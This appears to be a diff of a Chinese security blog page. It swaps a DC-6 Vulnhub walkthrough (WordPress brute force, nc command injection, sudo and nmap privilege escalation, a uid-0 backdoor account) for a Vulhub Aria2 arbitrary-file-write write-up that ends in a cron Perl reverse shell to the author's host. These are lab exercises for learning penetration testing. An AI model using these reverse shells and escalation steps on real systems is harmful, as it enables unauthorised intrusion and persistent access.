@@ -17,7 +17,7 @@
     <meta name="keywords" content="G00dddd">
 
 
-<title>DC-6 | G00d`s Blog</title>
+<title>Vulhub-9.Aria2 | G00d`s Blog</title>
 
 
 
@@ -390,7 +390,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">DC-6</h1>
+            <h1 class="post-title">Vulhub-9.Aria2</h1>
             
                 <div class="post-meta">
                     
@@ -399,14 +399,14 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:06:26</a>
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:22:00</a>
                         </span>
                     
                     
                         <span class="post-category">
                     Category:
                             
-                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                                <a href="../categories/Vulhub/">Vulhub</a>
                             
                         </span>
                     
@@ -415,49 +415,19 @@
         </header>
 
         <div class="post-content">
-            <h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><p>第一步信息收集</p>
-<p><img src="/dc-6//1.png" alt="1"></p>
-<p>192.168.213.158</p>
-<p><img src="/dc-6//2.png" alt="2"></p>
-<p>Vi &#x2F;etc&#x2F;hosts 把重定向加上就行了</p>
-<p>接着扫目录发现跟之前打过的靶机有点像</p>
-<p><img src="/dc-6//3.png" alt="3"></p>
-<p><img src="/dc-6//4.png" alt="4"></p>
-<p>用wpscan(专门搜索wordpross漏洞)再看看</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a></p>
-<p><img src="/dc-6//5.png" alt="5"></p>
-<p>用wpscan枚举一下用户名</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> –enumerate u</p>
-<p><img src="/dc-6//6.png" alt="6"></p>
-<p>爆出几个账号,cat &gt; 1.txt 保存一下,然后wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> -U 1.txt -P rockyou.txt</p>
-<p><img src="/dc-6//7.png" alt="7"></p>
-<p>Url&#x2F;wp-login.php 登录后台发现activity monitor</p>
-<p>用searchsploit activity monitor</p>
-<p><img src="/dc-6//8.png" alt="8"></p>
-<p><img src="/dc-6//../../../../%E5%88%B7%E9%A2%98/%E6%9C%AC%E5%9C%B0/vulnhub/media/image9.png"><img src="/dc-6//9.png" alt="9">这里有命令执行,127.0.0.1|nc -e &#x2F;bin&#x2F;bash 192.168.213.137 9999</p>
-<p><img src="/dc-6//10.png" alt="10"></p>
-<p>拿到普通权限</p>
-<p>Python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
-<p>在主机内部找信息</p>
-<p><img src="/dc-6//11.png" alt="11"></p>
-<p>Ssh <a href="mailto:&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;">&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;</a></p>
-<p>提权</p>
-<p><img src="/dc-6//12.png" alt="12"></p>
-<p>我们发现当前账号对backups.sh读写操作</p>
-<p>把shell写入backups</p>
-<p>Echo “&#x2F;bin&#x2F;bash” &gt;&gt; backups.sh</p>
-<p>Sudo -u jens .&#x2F;backups.sh &#x2F;&#x2F;这里用jens执行backups</p>
-<p><img src="/dc-6//13.png" alt="13"></p>
-<p>发现切换账号成功</p>
-<p>Sudo -l发现jens可以用root执行nmap,那就用nmap提权</p>
-<p><img src="/dc-6//14.png" alt="14"></p>
-<p>需要先看nmap的版本号 nmap -v</p>
-<p>然后把shell写入”shell”里,用nmap执行</p>
-<p>echo ‘os.execute(“&#x2F;bin&#x2F;sh”)’ &gt; shell</p>
-<p>sudo nmap –script&#x3D;shell</p>
-<p><img src="/dc-6//15.png" alt="15"></p>
-<p>添加root账号</p>
-<p>useradd -u 0 -o -g 0 -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;root1-m root1</p>
+            <h1 id="eAria2"><a href="#eAria2" class="headerlink" title="eAria2"></a>eAria2</h1><h2 id="任意文件写入漏洞"><a href="#任意文件写入漏洞" class="headerlink" title="任意文件写入漏洞"></a>任意文件写入漏洞</h2><p>Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP&#x2F;HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。</p>
+<p>6800是aria2的rpc服务的默认端口，环境启动后，访问`<a target="_blank" rel="noopener" href="http://your-ip:6800//%60%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%B7%B2%E5%90%AF%E5%8A%A8%E5%B9%B6%E4%B8%94%E8%BF%94%E5%9B%9E404%E9%A1%B5%E9%9D%A2%E3%80%82">http://your-ip:6800/\`，发现服务已启动并且返回404页面。</a></p>
+<p>因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 <a target="_blank" rel="noopener" href="http://binux.github.io/yaaw/demo/">http://binux.github.io/yaaw/demo/</a> 。</p>
+<p>打开yaaw，点击配置按钮，填入运行aria2的目标域名：`<a target="_blank" rel="noopener" href="http://your-ip:6800/jsonrpc/%60">http://your-ip:6800/jsonrpc\`</a>:</p>
+<p>我在我的某台主机写了shell文件,并且用py -m http.server开放了端口,用内网穿透工具映射到公网,这里用第三方UI远程下载这个shell</p>
+<p><img src="/vulhub-9-aria2//1.png" alt="1"></p>
+<p>提前开始监听nc -lvp 33</p>
+<p><img src="/vulhub-9-aria2//2.png" alt="2"></p>
+<p>上传成功</p>
+<p><img src="/vulhub-9-aria2//3.png" alt="3"></p>
+<p>* * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e ‘use Socket;$i&#x3D;”192.168.3.75”;$p&#x3D;33;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“&#x2F;bin&#x2F;sh -i”);};’</p>
+<p>等待几秒钟反弹成功</p>
+<p><img src="/vulhub-9-aria2//9.Aria2/4.png" alt="4"></p>
 
         </div>
 
@@ -494,10 +464,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="../dc-7/">DC-7</a>
+                <a class="prev" rel="prev" href="../vulhub-10-bashshellshock/">Vulhub-10.BashShellshock</a>
             
             
-            <a class="next" rel="next" href="../dc-5/">DC-5</a>
+            <a class="next" rel="next" href="../vulhub-8-appweb/">Vulhub-8.AppWeb</a>
             
         </section>
 
